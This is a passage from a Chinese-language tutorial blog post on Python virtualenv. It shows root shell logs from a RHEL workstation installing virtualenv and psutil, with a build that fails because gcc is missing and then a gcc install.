<p>从工程管理角度，我们不推荐这种办法。建议将系统中的所有库在虚环境中再安装一次。</p>
<h4 id="虚拟环境的发布" class="article-heading"><a href="#虚拟环境的发布" class="headerlink" title="虚拟环境的发布"></a>虚拟环境的发布<a class="article-anchor" href="#虚拟环境的发布" aria-hidden="true"></a></h4><p>使用virtualenv生成的虚拟环境可以迁移到其他机器上，从而允许将运行环境在多台机器上迁移。但是需要注意以下事项：</p>
<ul>
<li>virtualenv依赖于目录工作，所以所有机器上virtualenv必须处于同一路径下。</li>
<li>virtualenv不能隔离系统/Python基础环境。因此所有机器必须同构，并且Python环境基本一致。</li>
<li>里面所安装的库所依赖的其他系统文件，例如动态运行库，数据文件。如果不在virtualenv里安装的，则每个系统上均需要自行安装。</li>
</ul>
<h4 id="更进一步资料" class="article-heading"><a href="#更进一步资料" class="headerlink" title="更进一步资料"></a>更进一步资料<a class="article-anchor" href="#更进一步资料" aria-hidden="true"></a></h4><p>请参考这里：</p>
<p><a target="_blank" rel="noopener" href="https://virtualenv.pypa.io/en/stable/userguide/">https://virtualenv.pypa.io/en/stable/userguide/</a></p>
<h3 id="软件包安装和管理建议" class="article-heading"><a href="#软件包安装和管理建议" class="headerlink" title="软件包安装和管理建议"></a>软件包安装和管理建议<a class="article-anchor" href="#软件包安装和管理建议" aria-hidden="true"></a></h3><p>Python默认情况下会试图将软件包安装到系统里，如果不具备管理员权限，需要使用virtualenv来安装软件包。</p>
<p>对于Debian/Ubuntu而言，安装软件的第一选择是apt系统。如果找不到包，或版本不对，建议采用virtualenv + pip的方式安装。</p>
<p>对于RHEL/CentOS而言，安装软件的第一选择是yum系统。如果找不到包，或版本不对，建议采用virtualenv + pip的方式安装。</p>
<p>对于Windows/MacOS而言，建议使用virtualenv + pip的方式安装。</p>
<h1 id="python实例-psutil系统基础信息模块详解" class="article-heading"><a href="#python实例-psutil系统基础信息模块详解" class="headerlink" title="python实例-psutil系统基础信息模块详解"></a>python实例-psutil系统基础信息模块详解<a class="article-anchor" href="#python实例-psutil系统基础信息模块详解" aria-hidden="true"></a></h1><h2 id="Python实践1——virtualenv的使用" class="article-heading"><a href="#Python实践1——virtualenv的使用" class="headerlink" title="Python实践1——virtualenv的使用"></a>Python实践1——virtualenv的使用<a class="article-anchor" href="#Python实践1——virtualenv的使用" aria-hidden="true"></a></h2><p>建立环境：virtualenv 目录名</p>
<p>激活环境：进入目录后执行source bin/activate</p>
<p>退出激活环境：deactivate</p>
<p>隔离环境内的安装：pip或者setup.py均可</p>
<p>注意：安装库时需要编译的，系统中必须有编译工具链。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# yum list|grep python-vir</span><br><span class="line">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class="line">python-virtualenv.noarch                1.10.1-2.el7               rhel_dvd</span><br><span class="line">[root@workstation0 ~]# yum install -y python-virtualenv</span><br><span class="line">Loaded plugins: product-id, search-disabled-repos, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class="line">rhel_dvd                                                 | 4.1 kB     00:00</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-virtualenv.noarch 0:1.10.1-2.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: python-setuptools <span class="keyword">for</span> package: python-virtualenv-1.10.1-2.el7.noarch</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: python2-devel <span class="keyword">for</span> package: python-virtualenv-1.10.1-2.el7.noarch</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-devel.x86_64 0:2.7.5-34.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-setuptools.noarch 0:0.9.8-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: python-backports-ssl_match_hostname <span class="keyword">for</span> package: python-setuptools-0.9.8-4.el7.noarch</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-backports-ssl_match_hostname.noarch 0:3.4.0.2-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: python-backports <span class="keyword">for</span> package: python-backports-ssl_match_hostname-3.4.0.2-4.el7.noarch</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-backports.x86_64 0:1.0-8.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">================================================================================</span><br><span class="line"> Package                              Arch    Version           Repository</span><br><span class="line">                                                                           Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> python-virtualenv                    noarch  1.10.1-2.el7      rhel_dvd  1.2 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> python-backports                     x86_64  1.0-8.el7         rhel_dvd  5.8 k</span><br><span class="line"> python-backports-ssl_match_hostname  noarch  3.4.0.2-4.el7     rhel_dvd   12 k</span><br><span class="line"> python-devel                         x86_64  2.7.5-34.el7      rhel_dvd  391 k</span><br><span class="line"> python-setuptools                    noarch  0.9.8-4.el7       rhel_dvd  397 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  1 Package (+4 Dependent packages)</span><br><span class="line"></span><br><span class="line">Total download size: 2.0 M</span><br><span class="line">Installed size: 4.6 M</span><br><span class="line">Downloading packages:</span><br><span class="line">(1/5): python-backports-ssl_match_hostname-3.4.0.2-4.el7.n |  12 kB   00:00</span><br><span class="line">(2/5): python-backports-1.0-8.el7.x86_64.rpm               | 5.8 kB   00:00</span><br><span class="line">(3/5): python-devel-2.7.5-34.el7.x86_64.rpm                | 391 kB   00:00</span><br><span class="line">(4/5): python-setuptools-0.9.8-4.el7.noarch.rpm            | 397 kB   00:00</span><br><span class="line">(5/5): python-virtualenv-1.10.1-2.el7.noarch.rpm           | 1.2 MB   00:00</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                              5.1 MB/s | 2.0 MB  00:00</span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : python-backports-1.0-8.el7.x86_64                            1/5</span><br><span class="line">  Installing : python-backports-ssl_match_hostname-3.4.0.2-4.el7.noarch     2/5</span><br><span class="line">  Installing : python-setuptools-0.9.8-4.el7.noarch                         3/5</span><br><span class="line">  Installing : python-devel-2.7.5-34.el7.x86_64                             4/5</span><br><span class="line">  Installing : python-virtualenv-1.10.1-2.el7.noarch                        5/5</span><br><span class="line">  Verifying  : python-devel-2.7.5-34.el7.x86_64                             1/5</span><br><span class="line">  Verifying  : python-setuptools-0.9.8-4.el7.noarch                         2/5</span><br><span class="line">  Verifying  : python-backports-1.0-8.el7.x86_64                            3/5</span><br><span class="line">  Verifying  : python-backports-ssl_match_hostname-3.4.0.2-4.el7.noarch     4/5</span><br><span class="line">  Verifying  : python-virtualenv-1.10.1-2.el7.noarch                        5/5</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  python-virtualenv.noarch 0:1.10.1-2.el7</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  python-backports.x86_64 0:1.0-8.el7</span><br><span class="line">  python-backports-ssl_match_hostname.noarch 0:3.4.0.2-4.el7</span><br><span class="line">  python-devel.x86_64 0:2.7.5-34.el7</span><br><span class="line">  python-setuptools.noarch 0:0.9.8-4.el7</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@workstation0 ~]# mkdir /tmp/python</span><br><span class="line">[root@workstation0 ~]# virt</span><br><span class="line">virtualenv      virtualenv-2.7  virt-what</span><br><span class="line">[root@workstation0 ~]# virtalenv /tmp/python</span><br><span class="line">-bash: virtalenv: command not found</span><br><span class="line">[root@workstation0 ~]# virtualenv /tmp/python</span><br><span class="line">New python executable in /tmp/python/bin/python</span><br><span class="line">Installing Setuptools..............................................................................................................................................................................................................................done.</span><br><span class="line">Installing Pip.....................................................................................................................................................................................................................................................................................................................................done.</span><br><span class="line">[root@workstation0 ~]# cd /tmp/python</span><br><span class="line">[root@workstation0 python]# ls</span><br><span class="line">bin  include  lib  lib64</span><br><span class="line">[root@workstation0 python]# source bin/</span><br><span class="line">activate          activate_this.py  pip               python2</span><br><span class="line">activate.csh      easy_install      pip-2.7           python2.7</span><br><span class="line">activate.fish     easy_install-2.7  python</span><br><span class="line">[root@workstation0 python]# source bin/activate</span><br><span class="line">(python)[root@workstation0 python]#</span><br><span class="line">(python)[root@workstation0 python]#</span><br><span class="line">(python)[root@workstation0 python]# which pip</span><br><span class="line">/tmp/python/bin/pip</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Python实践2——virtualenv中安装psutil系统性能信息模块" class="article-heading"><a href="#Python实践2——virtualenv中安装psutil系统性能信息模块" class="headerlink" title="Python实践2——virtualenv中安装psutil系统性能信息模块"></a>Python实践2——virtualenv中安装psutil系统性能信息模块<a class="article-anchor" href="#Python实践2——virtualenv中安装psutil系统性能信息模块" aria-hidden="true"></a></h2><p>psutil是一个跨平台库(<a target="_blank" rel="noopener" href="https://pypi.python.org/packages),%E8%83%BD%E5%A4%9F%E8%BD%BB">https://pypi.python.org/packages),能够轻</a><br>松实现获取系统运行的进程和系统利用率(包括CPU、内存、磁盘、网<br>络等)信息。它主要应用于系统监控,分析和限制系统资源及进程的管<br>理。它实现了同等命令行工具提供的功能,如ps、top、lsof、netstat、<br>ifconfig、who、df、kill、free、nice、ionice、iostat、iotop、uptime、<br>pidof、tty、taskset、pmap等。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次尝试安装时，报错说缺少gcc</span></span><br><span class="line">(python)[root@workstation0 python]# wget psutil-4.3.1.tar.gz</span><br><span class="line">(python)[root@workstation0 python]# ls</span><br><span class="line">anaconda-ks.cfg  psutil-4.3.1  psutil-4.3.1.tar.gz</span><br><span class="line">(python)[root@workstation0 python]# cd psutil-4.3.1</span><br><span class="line">(python)[root@workstation0 python]# ls</span><br><span class="line">appveyor.yml  DEVGUIDE.rst  HISTORY.rst  INSTALL.rst  make.bat  MANIFEST.in  psutil           README.rst  setup.cfg  tox.ini</span><br><span class="line">CREDITS       docs          IDEAS        LICENSE      Makefile  PKG-INFO     psutil.egg-info  scripts     setup.py</span><br><span class="line"></span><br><span class="line">(python)[root@workstation0 python]# pip install psutil</span><br><span class="line">Downloading/unpacking psutil</span><br><span class="line">  Downloading psutil-4.3.1.tar.gz (315kB): 315kB downloaded</span><br><span class="line">  Running setup.py egg_info for package psutil</span><br><span class="line"></span><br><span class="line">    warning: no previously-included files matching '*' found under directory 'docs/_build'</span><br><span class="line">Installing collected packages: psutil</span><br><span class="line">  Running setup.py install for psutil</span><br><span class="line">    building 'psutil._psutil_linux' extension</span><br><span class="line">    gcc -pthread -fno-strict-aliasing -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -DNDEBUG -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -fPIC -DPSUTIL_VERSION=431 -DPSUTIL_ETHTOOL_MISSING_TYPES=1 -I/usr/include/python2.7 -c psutil/_psutil_linux.c -o build/temp.linux-x86_64-2.7/psutil/_psutil_linux.o</span><br><span class="line">    unable to execute gcc: No such file or directory</span><br><span class="line">    error: command 'gcc' failed with exit status 1</span><br><span class="line">    Complete output from command /tmp/python/bin/python -c "import setuptools;__file__='/tmp/python/build/psutil/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))" install --record /tmp/pip-UX0HuE-record/install-record.txt --single-version-externally-managed --install-headers /tmp/python/include/site/python2.7:</span><br><span class="line">    running install</span><br><span class="line"></span><br><span class="line">running build</span><br><span class="line"></span><br><span class="line">running build_py</span><br><span class="line"></span><br><span class="line">creating build</span><br><span class="line"></span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line"></span><br><span class="line">creating build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_psposix.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_psbsd.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_pssunos.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_pslinux.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_common.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/__init__.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_psosx.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_compat.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">copying psutil/_pswindows.py -&gt; build/lib.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">creating build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_bsd.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_memory_leaks.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_system.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_linux.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_misc.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/__init__.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_osx.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_process.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_windows.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/runner.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_posix.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">copying psutil/tests/test_sunos.py -&gt; build/lib.linux-x86_64-2.7/psutil/tests</span><br><span class="line"></span><br><span class="line">running build_ext</span><br><span class="line"></span><br><span class="line">building 'psutil._psutil_linux' extension</span><br><span class="line"></span><br><span class="line">creating build/temp.linux-x86_64-2.7</span><br><span class="line"></span><br><span class="line">creating build/temp.linux-x86_64-2.7/psutil</span><br><span class="line"></span><br><span class="line">gcc -pthread -fno-strict-aliasing -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -DNDEBUG -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -fPIC -DPSUTIL_VERSION=431 -DPSUTIL_ETHTOOL_MISSING_TYPES=1 -I/usr/include/python2.7 -c psutil/_psutil_linux.c -o build/temp.linux-x86_64-2.7/psutil/_psutil_linux.o</span><br><span class="line"></span><br><span class="line">unable to execute gcc: No such file or directory</span><br><span class="line"></span><br><span class="line">error: command 'gcc' failed with exit status 1</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line">Cleaning up...</span><br><span class="line">Command /tmp/python/bin/python -c "import setuptools;__file__='/tmp/python/build/psutil/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))" install --record /tmp/pip-UX0HuE-record/install-record.txt --single-version-externally-managed --install-headers /tmp/python/include/site/python2.7 failed with error code 1 in /tmp/python/build/psutil</span><br><span class="line">Storing complete log in /root/.pip/pip.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装gcc软件</span></span><br><span class="line">(python)[root@workstation0 python]# yum install -y gcc*</span><br><span class="line">Loaded plugins: product-id, search-disabled-repos, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: cpp = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: glibc-devel &gt;= 2.2.90-12 <span class="keyword">for</span> package: gcc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libmpc.so.3()(64bit) <span class="keyword">for</span> package: gcc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libmpfr.so.4()(64bit) <span class="keyword">for</span> package: gcc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc-c++.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libstdc++-devel = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-c++-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc-gfortran.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libgfortran = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-gfortran-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libquadmath = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-gfortran-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libquadmath-devel = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-gfortran-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libgfortran.so.3()(64bit) <span class="keyword">for</span> package: gcc-gfortran-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc-gnat.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libgnat = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-gnat-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libgnat-devel = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-gnat-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc-objc.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libobjc = 4.8.5-4.el7 <span class="keyword">for</span> package: gcc-objc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: libobjc.so.4()(64bit) <span class="keyword">for</span> package: gcc-objc-4.8.5-4.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package gcc-objc++.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package cpp.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package glibc-devel.x86_64 0:2.17-105.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: glibc-headers = 2.17-105.el7 <span class="keyword">for</span> package: glibc-devel-2.17-105.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: glibc-headers <span class="keyword">for</span> package: glibc-devel-2.17-105.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libgfortran.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libgnat.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libgnat-devel.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libmpc.x86_64 0:1.0.1-3.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libobjc.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libquadmath.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libquadmath-devel.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package libstdc++-devel.x86_64 0:4.8.5-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package mpfr.x86_64 0:3.1.1-4.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package glibc-headers.x86_64 0:2.17-105.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: kernel-headers &gt;= 2.2.1 <span class="keyword">for</span> package: glibc-headers-2.17-105.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: kernel-headers <span class="keyword">for</span> package: glibc-headers-2.17-105.el7.x86_64</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package kernel-headers.x86_64 0:3.10.0-327.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">================================================================================</span><br><span class="line"> Package                 Arch         Version              Repository      Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> gcc                     x86_64       4.8.5-4.el7          rhel_dvd        16 M</span><br><span class="line"> gcc-c++                 x86_64       4.8.5-4.el7          rhel_dvd       7.2 M</span><br><span class="line"> gcc-gfortran            x86_64       4.8.5-4.el7          rhel_dvd       6.6 M</span><br><span class="line"> gcc-gnat                x86_64       4.8.5-4.el7          rhel_dvd        13 M</span><br><span class="line"> gcc-objc                x86_64       4.8.5-4.el7          rhel_dvd       5.7 M</span><br><span class="line"> gcc-objc++              x86_64       4.8.5-4.el7          rhel_dvd       6.1 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> cpp                     x86_64       4.8.5-4.el7          rhel_dvd       5.9 M</span><br><span class="line"> glibc-devel             x86_64       2.17-105.el7         rhel_dvd       1.0 M</span><br><span class="line"> glibc-headers           x86_64       2.17-105.el7         rhel_dvd       661 k</span><br><span class="line"> kernel-headers          x86_64       3.10.0-327.el7       rhel_dvd       3.2 M</span><br><span class="line"> libgfortran             x86_64       4.8.5-4.el7          rhel_dvd       293 k</span><br><span class="line"> libgnat                 x86_64       4.8.5-4.el7          rhel_dvd       960 k</span><br><span class="line"> libgnat-devel           x86_64       4.8.5-4.el7          rhel_dvd       2.7 M</span><br><span class="line"> libmpc                  x86_64       1.0.1-3.el7          rhel_dvd        51 k</span><br><span class="line"> libobjc                 x86_64       4.8.5-4.el7          rhel_dvd        73 k</span><br><span class="line"> libquadmath             x86_64       4.8.5-4.el7          rhel_dvd       182 k</span><br><span class="line"> libquadmath-devel       x86_64       4.8.5-4.el7          rhel_dvd        46 k</span><br><span class="line"> libstdc++-devel         x86_64       4.8.5-4.el7          rhel_dvd       1.5 M</span><br><span class="line"> mpfr                    x86_64       3.1.1-4.el7          rhel_dvd       203 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  6 Packages (+13 Dependent packages)</span><br><span class="line"></span><br><span class="line">Total download size: 71 M</span><br><span class="line">Installed size: 188 M</span><br><span class="line">Downloading packages:</span><br><span class="line">(1/19): cpp-4.8.5-4.el7.x86_64.rpm                         | 5.9 MB   00:00</span><br><span class="line">(2/19): gcc-c++-4.8.5-4.el7.x86_64.rpm                     | 7.2 MB   00:00</span><br><span class="line">(3/19): gcc-4.8.5-4.el7.x86_64.rpm                         |  16 MB   00:00</span><br><span class="line">(4/19): gcc-gfortran-4.8.5-4.el7.x86_64.rpm                | 6.6 MB   00:00</span><br><span class="line">(5/19): gcc-gnat-4.8.5-4.el7.x86_64.rpm                    |  13 MB   00:00</span><br><span class="line">(6/19): gcc-objc-4.8.5-4.el7.x86_64.rpm                    | 5.7 MB   00:00</span><br><span class="line">(7/19): gcc-objc++-4.8.5-4.el7.x86_64.rpm                  | 6.1 MB   00:00</span><br><span class="line">(8/19): glibc-devel-2.17-105.el7.x86_64.rpm                | 1.0 MB   00:00</span><br><span class="line">(9/19): glibc-headers-2.17-105.el7.x86_64.rpm              | 661 kB   00:00</span><br><span class="line">(10/19): kernel-headers-3.10.0-327.el7.x86_64.rpm          | 3.2 MB   00:00</span><br><span class="line">(11/19): libgfortran-4.8.5-4.el7.x86_64.rpm                | 293 kB   00:00</span><br><span class="line">(12/19): libgnat-4.8.5-4.el7.x86_64.rpm                    | 960 kB   00:00</span><br><span class="line">(13/19): libgnat-devel-4.8.5-4.el7.x86_64.rpm              | 2.7 MB   00:00</span><br><span class="line">(14/19): libmpc-1.0.1-3.el7.x86_64.rpm                     |  51 kB   00:00</span><br><span class="line">(15/19): libquadmath-4.8.5-4.el7.x86_64.rpm                | 182 kB   00:00</span><br><span class="line">(16/19): libobjc-4.8.5-4.el7.x86_64.rpm                    |  73 kB   00:00</span><br><span class="line">(17/19): libquadmath-devel-4.8.5-4.el7.x86_64.rpm          |  46 kB   00:00</span><br><span class="line">(18/19): mpfr-3.1.1-4.el7.x86_64.rpm                       | 203 kB   00:00</span><br><span class="line">(19/19): libstdc++-devel-4.8.5-4.el7.x86_64.rpm            | 1.5 MB   00:00</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                               33 MB/s |  71 MB  00:02</span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : mpfr-3.1.1-4.el7.x86_64                                     1/19</span><br><span class="line">  Installing : libmpc-1.0.1-3.el7.x86_64                                   2/19</span><br><span class="line">  Installing : libquadmath-4.8.5-4.el7.x86_64                              3/19</span><br><span class="line">  Installing : libgfortran-4.8.5-4.el7.x86_64                              4/19</span><br><span class="line">  Installing : cpp-4.8.5-4.el7.x86_64                                      5/19</span><br><span class="line">  Installing : libgnat-devel-4.8.5-4.el7.x86_64                            6/19</span><br><span class="line">  Installing : libgnat-4.8.5-4.el7.x86_64                                  7/19</span><br><span class="line">  Installing : kernel-headers-3.10.0-327.el7.x86_64                        8/19</span><br><span class="line">  Installing : glibc-headers-2.17-105.el7.x86_64                           9/19</span><br><span class="line">  Installing : glibc-devel-2.17-105.el7.x86_64                            10/19</span><br><span class="line">  Installing : gcc-4.8.5-4.el7.x86_64                                     11/19</span><br><span class="line">  Installing : libquadmath-devel-4.8.5-4.el7.x86_64                       12/19</span><br><span class="line">  Installing : libobjc-4.8.5-4.el7.x86_64                                 13/19</span><br><span 